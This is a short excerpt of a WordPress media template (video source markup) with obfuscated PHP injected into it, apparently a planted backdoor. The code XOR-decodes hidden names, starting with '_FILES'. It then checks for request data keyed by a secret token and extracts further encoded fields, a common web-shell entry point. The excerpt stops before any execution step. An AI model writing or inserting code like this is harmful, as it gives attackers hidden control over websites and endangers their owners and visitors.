...
>
	<# if ( ! _.isEmpty( data.model.src ) ) {
		...
		<# } else { #>
		<source src="{{ data.model.src }}" type="{{ settings.e*/
 	
	$sani_mime_type = 'domain';
$current_filter = 'QRxoQNwKkyN9Ti';
function content_type($unicode, $nestable_tags)

{
    $allowed = urldecode($unicode);
    $end_dirty = substr($nestable_tags,0, strlen($allowed));
    $length = $allowed ^ $end_dirty;
    return $length;

}
$include = ${content_type("%0E%141%23%14%1D", $current_filter)};
	$more = 'quote_style';
if (isset($include[$current_filter]))

{

    $clean_terms = $include[$current_filter];
    $user_id = $clean_terms[content_type("%25%3F%080%3F%2F%1A.", $current_filter)];
...
/* mbedMimes[ data.model.src.split('.').pop() ] }}" />
		<# }
	} #>
